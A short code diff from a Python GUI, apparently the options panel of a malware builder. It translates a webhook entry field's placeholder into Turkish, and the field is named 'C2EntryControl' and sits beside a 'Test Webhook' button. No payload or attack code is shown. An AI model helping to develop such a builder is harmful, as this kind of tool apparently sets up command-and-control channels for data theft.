@@ -154,7 +154,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		# Controls
 
-		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
+		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "webhook kodu gir", height= 38, font= self.font, text_color= "white")
 		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
 
 		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
